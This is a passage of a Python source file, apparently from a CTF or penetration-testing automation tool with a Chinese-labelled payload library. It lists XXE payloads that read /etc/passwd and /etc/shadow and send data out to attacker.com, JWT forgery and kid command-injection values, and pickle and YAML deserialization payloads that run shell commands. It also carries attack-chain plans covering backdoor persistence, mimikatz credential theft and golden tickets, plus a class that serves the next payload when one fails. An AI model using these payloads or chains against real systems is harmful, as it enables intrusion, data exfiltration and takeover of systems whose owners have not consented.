        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>', "desc": "DoS随机设备", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>', "desc": "netdoc协议", "indicators": ["root:"]},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///tmp/evil.jar!/evil.xml">]><foo>&xxe;</foo>', "desc": "JAR协议", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>', "desc": "shadow文件", "indicators": []},
    ],

    # 盲XXE (10个)
    "blind": [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=test">%xxe;]>', "desc": "OOB数据外带", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">%eval;%exfil;]>', "desc": "参数实体外带", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]>', "desc": "外部DTD外带", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd">', "desc": "外部DTD加载", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">]><foo>&xxe;</foo>', "desc": "内网探测", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>', "desc": "端口扫描", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/%file;">]><foo>&xxe;</foo>', "desc": "FTP外带", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%intern;%trick;]>', "desc": "三阶段外带", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM \'http://attacker.com/?c=%content;\'>">%payload;]>', "desc": "嵌套实体", "indicators": []},
        {"payload": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>', "desc": "SVG XXE", "indicators": []},
    ],

    # WAF绕过 (8个)
    "waf_bypass": [
        {"payload": '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "desc": "UTF-16编码", "bypass": "encoding"},
        {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "desc": "省略XML声明", "bypass": "no_declaration"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/etc/passwd">]><foo>&xxe;</foo>', "desc": "单斜杠file", "bypass": "single_slash"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "data://text/plain;base64,PCFFTlRJVFkgZXh0IFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4=">%xxe;]><foo>&ext;</foo>', "desc": "Base64 DTD", "bypass": "base64"},
        {"payload": '<?xml version="1.0"?>\n<!DOCTYPE foo\n[\n<!ENTITY xxe\nSYSTEM\n"file:///etc/passwd"\n>\n]\n><foo>&xxe;</foo>', "desc": "换行分割", "bypass": "newlines"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file&#58;///etc/passwd">]><foo>&xxe;</foo>', "desc": "HTML实体编码", "bypass": "entity"},
        {"payload": '<!--?xml version="1.0"?--><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "desc": "注释伪装", "bypass": "comment"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE :foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><:foo>&xxe;</:foo>', "desc": "命名空间绕过", "bypass": "namespace"},
    ],
}


# ==================== JWT攻击 Payload库 (20+) ====================

JWT_PAYLOADS = {
    # 算法攻击 (8个)
    "algorithm": [
        {"payload": '{"alg":"none"}', "desc": "none算法", "attack": "none_algorithm"},
        {"payload": '{"alg":"None"}', "desc": "None大写", "attack": "none_case"},
        {"payload": '{"alg":"NONE"}', "desc": "NONE全大写", "attack": "none_upper"},
        {"payload": '{"alg":"nOnE"}', "desc": "混合大小写", "attack": "none_mixed"},
        {"payload": '{"alg":"HS256"}', "desc": "RS256->HS256混淆", "attack": "key_confusion"},
        {"payload": '{"alg":"HS384"}', "desc": "RS384->HS384混淆", "attack": "key_confusion_384"},
        {"payload": '{"alg":"HS512"}', "desc": "RS512->HS512混淆", "attack": "key_confusion_512"},
        {"payload": '{"alg":"PS256"}', "desc": "算法替换", "attack": "alg_replace"},
    ],

    # 弱密钥 (8个)
    "weak_secret": [
        {"payload": "secret", "desc": "常见密钥", "attack": "weak_key"},
        {"payload": "password", "desc": "password密钥", "attack": "weak_key"},
        {"payload": "123456", "desc": "数字密钥", "attack": "weak_key"},
        {"payload": "", "desc": "空密钥", "attack": "empty_key"},
        {"payload": "jwt_secret", "desc": "默认密钥", "attack": "default_key"},
        {"payload": "your-256-bit-secret", "desc": "JWT示例密钥", "attack": "example_key"},
        {"payload": "secretkey", "desc": "secretkey", "attack": "weak_key"},
        {"payload": "admin", "desc": "admin密钥", "attack": "weak_key"},
    ],

    # 注入攻击 (6个)
    "injection": [
        {"payload": '{"kid":"../../../dev/null"}', "desc": "kid路径遍历", "attack": "kid_injection"},
        {"payload": '{"kid":"key.pem\'; cat /etc/passwd; #"}', "desc": "kid命令注入", "attack": "kid_rce"},
        {"payload": '{"kid":"key\' UNION SELECT \'secret\'--"}', "desc": "kid SQL注入", "attack": "kid_sqli"},
        {"payload": '{"jku":"http://attacker.com/jwks.json"}', "desc": "jku注入", "attack": "jku_injection"},
        {"payload": '{"x5u":"http://attacker.com/cert.pem"}', "desc": "x5u注入", "attack": "x5u_injection"},
        {"payload": '{"jwk":{"kty":"oct","k":"base64-secret"}}', "desc": "内嵌密钥", "attack": "embedded_jwk"},
    ],
}


# ==================== 反序列化 Payload库 (25+) ====================

DESERIALIZATION_PAYLOADS = {
    # Java (10个)
    "java": [
        {"payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAWYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEGxvY2FsaG9zdDoxMzM3N3QAAHEAfgAFdAAEaHR0cHB4dAAVaHR0cDovL2xvY2FsaG9zdDoxMzM3N3g=", "desc": "URLDNS探测", "indicators": []},
        {"payload": "CommonsCollections1", "desc": "CC1链", "indicators": []},
        {"payload": "CommonsCollections2", "desc": "CC2链", "indicators": []},
        {"payload": "CommonsCollections3", "desc": "CC3链", "indicators": []},
        {"payload": "CommonsCollections4", "desc": "CC4链", "indicators": []},
        {"payload": "CommonsCollections5", "desc": "CC5链", "indicators": []},
        {"payload": "CommonsCollections6", "desc": "CC6链", "indicators": []},
        {"payload": "CommonsCollections7", "desc": "CC7链", "indicators": []},
        {"payload": "CommonsBeanutils1", "desc": "CB1链", "indicators": []},
        {"payload": "JRMPClient", "desc": "JRMP客户端", "indicators": []},
    ],

    # PHP (8个)
    "php": [
        {"payload": 'O:8:"stdClass":0:{}', "desc": "基础对象", "indicators": []},
        {"payload": 'a:1:{i:0;O:8:"stdClass":0:{}}', "desc": "数组包装", "indicators": []},
        {"payload": 'O:7:"Example":1:{s:4:"data";s:4:"test";}', "desc": "属性注入", "indicators": []},
        {"payload": 'O:+7:"Example":1:{s:4:"data";s:4:"test";}', "desc": "+号绕过", "indicators": []},
        {"payload": 'O:7:"Example":1:{S:4:"\\64\\61\\74\\61";s:4:"test";}', "desc": "十六进制属性名", "indicators": []},
        {"payload": 'C:11:"ArrayObject":37:{x:i:0;a:1:{i:0;O:8:"stdClass":0:{}};m:a:0:{}}', "desc": "ArrayObject", "indicators": []},
        {"payload": '__destruct()', "desc": "析构函数利用", "indicators": []},
        {"payload": '__wakeup()', "desc": "唤醒函数利用", "indicators": []},
    ],

    # Python (7个)
    "python": [
        {"payload": "cos\nsystem\n(S'id'\ntR.", "desc": "Pickle os.system", "indicators": ["uid="]},
        {"payload": "csubprocess\nPopen\n(S'id'\ntR.", "desc": "Pickle subprocess", "indicators": []},
        {"payload": "c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.", "desc": "Pickle eval", "indicators": []},
        {"payload": "(S'__import__(\"os\").popen(\"id\").read()'\nS'eval'\nos.system\n.", "desc": "Pickle popen", "indicators": []},
        {"payload": '{"__class__": "__main__.os", "__args__": ["system"], "__kwargs__": {"cmd": "id"}}', "desc": "JSON类注入", "indicators": []},
        {"payload": "!!python/object/apply:os.system ['id']", "desc": "YAML RCE", "indicators": []},
        {"payload": "!!python/object/new:subprocess.check_output [['id']]", "desc": "YAML subprocess", "indicators": []},
    ],
}


# ==================== 多阶段攻击链 ====================

ATTACK_CHAINS = {
    # Web应用攻击链
    "web_full_chain": {
        "name": "Web应用完整攻击链",
        "phases": [
            {
                "phase": "reconnaissance",
                "tools": ["nmap_scan", "whatweb_scan", "gobuster_scan"],
                "objective": "收集目标信息，发现入口点"
            },
            {
                "phase": "vulnerability_discovery",
                "tools": ["nuclei_scan", "sqlmap_scan", "nikto_scan"],
                "objective": "发现可利用漏洞"
            },
            {
                "phase": "exploitation",
                "tools": ["sqlmap_scan", "metasploit_run"],
                "objective": "利用漏洞获取访问权限"
            },
            {
                "phase": "privilege_escalation",
                "tools": ["linux_enum", "windows_enum"],
                "objective": "提升权限至root/SYSTEM"
            },
            {
                "phase": "persistence",
                "tools": ["backdoor_install", "cron_job"],
                "objective": "建立持久化访问"
            },
            {
                "phase": "data_extraction",
                "tools": ["database_dump", "file_exfiltration"],
                "objective": "提取敏感数据/flag"
            }
        ]
    },

    # CTF快速攻击链
    "ctf_speed_chain": {
        "name": "CTF快速攻击链",
        "phases": [
            {
                "phase": "quick_scan",
                "tools": ["nmap_fast", "gobuster_fast"],
                "objective": "快速识别服务和路径"
            },
            {
                "phase": "vuln_check",
                "tools": ["nuclei_fast", "common_vuln_check"],
                "objective": "检测常见CTF漏洞"
            },
            {
                "phase": "exploit",
                "tools": ["auto_exploit"],
                "objective": "自动利用发现的漏洞"
            },
            {
                "phase": "flag_hunt",
                "tools": ["flag_search", "file_read"],
                "objective": "搜索并提取flag"
            }
        ]
    },

    # 内网渗透链
    "internal_chain": {
        "name": "内网渗透攻击链",
        "phases": [
            {
                "phase": "initial_access",
                "tools": ["phishing", "exploit_public_app"],
                "objective": "获取内网初始立足点"
            },
            {
                "phase": "discovery",
                "tools": ["arp_scan", "netdiscover", "bloodhound"],
                "objective": "内网资产发现"
            },
            {
                "phase": "lateral_movement",
                "tools": ["psexec", "wmi", "ssh_pivot"],
                "objective": "横向移动到其他主机"
            },
            {
                "phase": "credential_access",
                "tools": ["mimikatz", "hashdump", "kerberoast"],
                "objective": "获取凭据"
            },
            {
                "phase": "domain_admin",
                "tools": ["dcsync", "golden_ticket"],
                "objective": "获取域管权限"
            }
        ]
    }
}


# ==================== 智能检测器 ====================

class EnhancedDetector:
    """增强型漏洞检测器"""

    def __init__(self):
        self.payloads = {
            "sqli": SQL_INJECTION_PAYLOADS,
            "xss": XSS_PAYLOADS,
            "cmdi": COMMAND_INJECTION_PAYLOADS,
            "lfi": LFI_PAYLOADS,
            "ssti": SSTI_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "xxe": XXE_PAYLOADS,
            "jwt": JWT_PAYLOADS,
            "deser": DESERIALIZATION_PAYLOADS,
        }
        self.attack_chains = ATTACK_CHAINS

    def get_payloads(self, vuln_type: str, category: str = None, bypass: bool = False) -> List[Dict]:
        """获取指定漏洞类型的Payload"""
        if vuln_type not in self.payloads:
            return []

        vuln_payloads = self.payloads[vuln_type]

        if category and category in vuln_payloads:
            payloads = vuln_payloads[category]
        else:
            # 合并所有类别
            payloads = []
            for cat_payloads in vuln_payloads.values():
                payloads.extend(cat_payloads)

        if bypass:
            # 只返回带绕过技术的payload
            payloads = [p for p in payloads if p.get("bypass")]

        return payloads

    def get_waf_bypass_payloads(self, vuln_type: str) -> List[Dict]:
        """获取WAF绕过Payload"""
        return self.get_payloads(vuln_type, "waf_bypass")

    def get_attack_chain(self, chain_type: str) -> Dict:
        """获取攻击链"""
        return self.attack_chains.get(chain_type, {})

    def suggest_next_payload(self, vuln_type: str, failed_payloads: List[str]) -> Dict:
        """根据失败的payload建议下一个"""
        all_payloads = self.get_payloads(vuln_type)
        failed_set = set(failed_payloads)

        for payload in all_payloads:
            if payload["payload"] not in failed_set:
                return payload

        # 所有基础payload都失败了，尝试WAF绕过
        bypass_payloads = self.get_waf_bypass_payloads(vuln_type)
        for payload in bypass_payloads:
            if payload["payload"] not in failed_set:
                return payload

        return {"payload": None, "desc": "所有payload已尝试"}

    def get_payload_count(self, vuln_type: str = None) -> Dict[str, int]:
        """获取Payload数量统计"""
        if vuln_type:
            if vuln_type not in self.payloads:
                return {vuln_type: 0}
            total = sum(len(cat) for cat in self.payloads[vuln_type].values())
            return {vuln_type: total}

        counts = {}
        for vt, categories in self.payloads.items():
            counts[vt] = sum(len(cat) for cat in categories.values())
        counts["total"] = sum(counts.values())
        return counts


# ==================== 全局实例 ====================

_enhanced_detector: Optional[EnhancedDetector] = None


def get_enhanced_detector() -> EnhancedDetector:
    """获取增强检测器单例"""
    global _enhanced_detector
    if _enhanced_detector is None:
        _enhanced_detector = EnhancedDetector()
    return _enhanced_detector


def get_enhanced_payloads(vuln_type: str, category: str = None) -> List[Dict]:
    """便捷函数：获取增强Payload"""
    return get_enhanced_detector().get_payloads(vuln_type, category)


def get_waf_bypass(vuln_type: str) -> List[Dict]:
    """便捷函数：获取WAF绕过Payload"""
    return get_enhanced_detector().get_waf_bypass_payloads(vuln_type)


def get_chain(chain_type: str) -> Dict:
    """便捷函数：获取攻击链"""
    return get_enhanced_detector().get_attack_chain(chain_type)


def payload_stats() -> Dict[str, int]:
    """便捷函数：获取Payload统计"""
    return get_enhanced_detector().get_payload_count()


# ==================== 版本信息 ====================

__version__ = "2.0.0"
__description__ = "Enhanced CTF Knowledge Base with 300+ payloads and multi-stage attack chains"
